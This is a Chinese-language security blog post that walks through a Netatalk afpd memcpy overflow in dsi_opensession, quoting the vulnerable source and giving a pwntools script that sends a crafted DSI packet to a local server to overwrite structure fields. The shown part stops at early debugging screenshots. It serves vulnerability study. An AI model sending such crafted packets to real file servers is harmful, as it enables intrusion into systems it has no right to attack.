<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Ld1ng">



    <meta name="description" content="Ld1ng's Blog">


    <meta name="keywords" content="CTF,code,CUMT">


<title>关于NETATALK的一个老BUG | Ld1ng</title>



    <link rel="icon" href="/favicon.ico">



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    




    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.0.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/links">Links</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/links">Links</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">关于NETATALK的一个老BUG</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Ld1ng</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">January 7, 2022</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/LEARNING/">LEARNING</a>
                            
                        </span>
                    
                     
    <span class="post-count">
Words:
    <a href="">3.7k</a>  
    </span>


    <span class="post-count">
Time:
    <a href="">18min</a>  
    </span>

                </div>
            
        </header>

        <div class="post-content">
            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天看到一个很经典的cve，顺便写一篇博客<br>漏洞是利用memcpy长度没限制导致的越界写，可覆盖关键变量，导致有一次任意地址写</p>
<p>原文：<a target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172">Exploiting an 18 Year Old Bug</a></p>
<p>源码：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11">Netatalk3.1.11</a></p>
<h1 id="0x01-源码"><a href="#0x01-源码" class="headerlink" title="0x01 源码"></a>0x01 源码</h1><p>为了调试方便直接下载好二进制、配置文件、运行库，这样就无需自己编译和安装依赖性<br>我的本地是Ubuntu18.04，配置文件：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Global]</span><br><span class="line">afp port = 5566</span><br><span class="line">disconnect time = 0</span><br><span class="line">max connections = 1000</span><br><span class="line">sleep time = 0</span><br></pre></td></tr></table></figure>

<p><code>Netatalk</code>是AppleTalk的开源实现方案，可以用作文件服务器来实现文件共享，afpd是其中的一个组件，类似于httpd的拿来做通信的部分，源码目录的<code>./etc/afpd</code>子目录为相关源码树。</p>
<p>看一些关键函数：<br><strong>dsi_tcp_open()</strong></p>
<p>该函数首先会调用fork()函数建立新的子进程，并在子进程中执行如下逻辑：先从TCP会话中读取DSI header到结构体dsi-&gt;header，之后读取DSI payload内容放在dsi-&gt;commands指向的buf中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">pid_t</span> <span class="title">dsi_tcp_open</span><span class="params">(DSI *dsi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    SOCKLEN_T len;</span><br><span class="line"></span><br><span class="line">    len = <span class="keyword">sizeof</span>(dsi-&gt;client);</span><br><span class="line">    dsi-&gt;socket = accept(dsi-&gt;serversock, (struct sockaddr *) &amp;dsi-&gt;client, &amp;len);</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dsi-&gt;socket &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    getitimer(ITIMER_PROF, &amp;itimer);</span><br><span class="line">    <span class="comment">/* 建立子进程 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (pid = fork()) ) &#123; <span class="comment">/* child */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">timer</span> =</span> &#123; &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, &#123;DSI_TCPTIMEOUT, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">newact</span>, <span class="title">oldact</span>;</span></span><br><span class="line">        <span class="keyword">uint8_t</span> block[DSI_BLOCKSIZ];</span><br><span class="line">        <span class="keyword">size_t</span> stored;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        dsi_init_buffer(dsi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in commands. this is similar to dsi_receive except</span></span><br><span class="line"><span class="comment">         * for the fact that we do some sanity checking to prevent</span></span><br><span class="line"><span class="comment">         * delinquent connections from causing mischief. */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 先读两个字节 */</span></span><br><span class="line">        len = dsi_stream_read(dsi, block, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!len ) &#123;</span><br><span class="line">            <span class="comment">/* connection already closed, don&#x27;t log it (normal OSX 10.3 behaviour) */</span></span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLOSED);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span> || (block[<span class="number">0</span>] &gt; DSIFL_MAX) || (block[<span class="number">1</span>] &gt; DSIFUNC_MAX)) &#123;</span><br><span class="line">            LOG(log_error, logtype_dsi, <span class="string">&quot;dsi_tcp_open: invalid header&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 读取DSI header剩下内容 */</span></span><br><span class="line">        stored = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; DSI_BLOCKSIZ) &#123;</span><br><span class="line">            len = dsi_stream_read(dsi, block + stored, <span class="keyword">sizeof</span>(block) - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">&quot;dsi_tcp_open: stream_read: %s&quot;</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 将DSI header的内容依次赋值给dsi-header结构体 */</span></span><br><span class="line">        dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">        dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_code, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_code));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">        dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* make sure we don&#x27;t over-write our buffers. */</span></span><br><span class="line">        dsi-&gt;cmdlen = min(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 读取payload内容到commands指针指向的buf中 */</span></span><br><span class="line">        stored = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; dsi-&gt;cmdlen) &#123;</span><br><span class="line">            len = dsi_stream_read(dsi, dsi-&gt;commands + stored, dsi-&gt;cmdlen - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">&quot;dsi_tcp_open: stream_read: %s&quot;</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send back our pid */</span></span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>dsi_getsession()</strong></p>
<p>该函数开启一个DSI会话，从TCP socket接收会话消息，保存至结构体DSI中。 函数首先调用dsi-&gt;proto_open(dsi)进行TCP消息的接收和处理，该函数实体为dsi_tcp_open()。根据返回值是父进程还是子进程，进入不同的处理逻辑。父进程则直接返回，继续监听，子进程则进入之后的DSI消息处理逻辑，根据dsi_command的值，选择不同的处理方式，若dsi_command为DSIFUNC_OPEN，则调用dsi_opensession()函数，初始化DSI会话。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dsi_getsession</span><span class="params">(DSI *dsi, <span class="keyword">server_child_t</span> *serv_children, <span class="keyword">int</span> tickleval, <span class="keyword">afp_child_t</span> **childp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (pid = dsi-&gt;proto_open(dsi)) &#123; <span class="comment">/* in libatalk/dsi/dsi_tcp.c */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">    <span class="comment">/* if we fail, just return. it might work later */</span></span><br><span class="line">    LOG(log_error, logtype_dsi, <span class="string">&quot;dsi_getsess: %s&quot;</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child. mostly handled below. */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="comment">/* parent */</span></span><br><span class="line">    <span class="comment">/* using SIGKILL is hokey, but the child might not have</span></span><br><span class="line"><span class="comment">     * re-established its signal handler for SIGTERM yet. */</span></span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    dsi-&gt;proto_close(dsi);</span><br><span class="line">    *childp = child;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (dsi-&gt;header.dsi_command) &#123;</span><br><span class="line">  <span class="keyword">case</span> DSIFUNC_STAT: <span class="comment">/* send off status and return */</span></span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">case</span> DSIFUNC_OPEN: <span class="comment">/* setup session */</span></span><br><span class="line">    <span class="comment">/* set up the tickle timer */</span></span><br><span class="line">    dsi-&gt;timer.it_interval.tv_sec = dsi-&gt;timer.it_value.tv_sec = tickleval;</span><br><span class="line">    dsi-&gt;timer.it_interval.tv_usec = dsi-&gt;timer.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line">    dsi_opensession(dsi);</span><br><span class="line">    *childp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="comment">/* just close */</span></span><br><span class="line">    LOG(log_info, logtype_dsi, <span class="string">&quot;DSIUnknown %d&quot;</span>, dsi-&gt;header.dsi_command);</span><br><span class="line">    dsi-&gt;proto_close(dsi);</span><br><span class="line">    <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>dsi_opensession()</strong></p>
<p>函数首先根据commands[0]的内容决定处理逻辑，若为DSIOPT_ATTNQUANT，则执行memcpy，以commands[1]为大小，将commands[2]之后的内容拷贝至DSI结构体的attn_quantum成员变量（4 bytes）。之后程序会构建新的DSI消息到dsi-&gt;commands中，将server_quantum的值返回给客户端。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dsi_opensession</span><span class="params">(DSI *dsi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> i = <span class="number">0</span>; <span class="comment">/* this serves double duty. it must be 4-bytes long */</span></span><br><span class="line">  <span class="keyword">int</span> offs;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* parse options */</span></span><br><span class="line">  <span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (dsi-&gt;commands[i++]) &#123;</span><br><span class="line">    <span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);</span><br><span class="line">      dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DSIOPT_SERVQUANT: <span class="comment">/* just ignore these */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* let the client know the server quantum. we don&#x27;t use the</span></span><br><span class="line"><span class="comment">   * max server quantum due to a bug in appleshare client 3.8.6. */</span></span><br><span class="line">  dsi-&gt;header.dsi_flags = DSIFL_REPLY;</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_code = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* dsi-&gt;header.dsi_command = DSIFUNC_OPEN;*/</span></span><br><span class="line"></span><br><span class="line">  dsi-&gt;cmdlen = <span class="number">2</span> * (<span class="number">2</span> + <span class="keyword">sizeof</span>(i)); <span class="comment">/* length of data. dsi_send uses it. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DSI Option Server Request Quantum */</span></span><br><span class="line">  dsi-&gt;commands[<span class="number">0</span>] = DSIOPT_SERVQUANT;</span><br><span class="line">  dsi-&gt;commands[<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(( dsi-&gt;server_quantum &lt; DSI_SERVQUANT_MIN || </span><br><span class="line">	      dsi-&gt;server_quantum &gt; DSI_SERVQUANT_MAX ) ? </span><br><span class="line">	    DSI_SERVQUANT_DEF : dsi-&gt;server_quantum);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* AFP replaycache size option */</span></span><br><span class="line">  offs = <span class="number">2</span> + <span class="keyword">sizeof</span>(i);</span><br><span class="line">  dsi-&gt;commands[offs] = DSIOPT_REPLCSIZE;</span><br><span class="line">  dsi-&gt;commands[offs+<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(REPLAYCACHE_SIZE);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + offs + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">  dsi_send(dsi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点也就在这个函数内，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (dsi-&gt;commands[i++]) &#123;</span><br><span class="line">    <span class="keyword">case</span> DSIOPT_ATTNQUANT:  <span class="comment">// #define DSIOPT_ATTNQUANT 0x01    </span></span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);</span><br><span class="line">      dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br></pre></td></tr></table></figure>

<p>memcpy的长度参数 dsi-&gt;commands[i] 由外部传入，且没检查大小，导致可溢出到DSI结构体中attn_quantum的后续成员。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSI_DATASIZ       65536</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">uint32_t</span> attn_quantum, datasize, server_quantum;</span><br><span class="line">    <span class="keyword">uint16_t</span> serverID, clientID;</span><br><span class="line">    <span class="keyword">uint8_t</span>  *commands; <span class="comment">/* DSI recieve buffer */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  data[DSI_DATASIZ];    <span class="comment">/* DSI reply buffer */</span></span><br></pre></td></tr></table></figure>

<p>但可见成员 commands 的类型为uint8_t*，所以memcpy的最大长度是0xff。并且由于 DSI_DATASIZ 为65535，所以溢出部分data后就无法向后溢出了，故最终只能溢出如上这些成员变量。</p>
<p>利用之前先搞懂dsi是什么：<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_Stream_Interface">Data Stream Interface</a>，按照协议格式可以构造其各个字段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commands = <span class="string">&quot;\x01&quot;</span>   <span class="comment">// DSIOPT_ATTNQUANT 选项的值</span></span><br><span class="line">commands += <span class="string">&quot;\x80&quot;</span>  <span class="comment">// 数据长度</span></span><br><span class="line">commands += <span class="string">&quot;\xaa&quot;</span> * <span class="number">0x80</span></span><br></pre></td></tr></table></figure>

<p>于是明白之后，我们可以交互试一下，构造一个dsi数据包，并给发送给目标的tcp端口(本地测试)，看看能否返回server_quantum的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">5566</span>)</span><br><span class="line">cmd  = <span class="string">b&#x27;\x01&#x27;</span>+ p8(<span class="number">0xc</span>)+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">dsi  = <span class="string">b&#x27;\x00\x04\x00\x01&#x27;</span> <span class="comment">#header部分的字段意义见原文</span></span><br><span class="line">dsi += p32(<span class="number">0</span>)</span><br><span class="line">dsi += p32(<span class="built_in">len</span>(cmd)) </span><br><span class="line">dsi += p32(<span class="number">0</span>)</span><br><span class="line">dsi += cmd</span><br><span class="line">io.send(dsi)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/01/07/kUTm9jVOvxAr6Io.png" alt="image-20220107153501796"></p>
<p>测试确实可以收到bbbb</p>
<p><img src="https://s2.loli.net/2022/01/07/nRK9jcgTPFz1Ndi.png" alt="image-20220107155401775"></p>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>漏洞点1：</p>
<p>接下来具体看一下内存情况，继续使用上面的脚本，启动gdb找到bbbb</p>
<p><img src="https://s2.loli.net/2022/01/07/xWvndjtp89eam7S.png" alt="image-20220107160010721"></p>
<p>对应DSI的结构体，可以知道0x00007f5f3d6c8010即commands，再看一下内存布局</p>
<p><img src="https://s2.loli.net/2022/01/07/jh4BRb89DFCzmMJ.png" alt="img"></p>
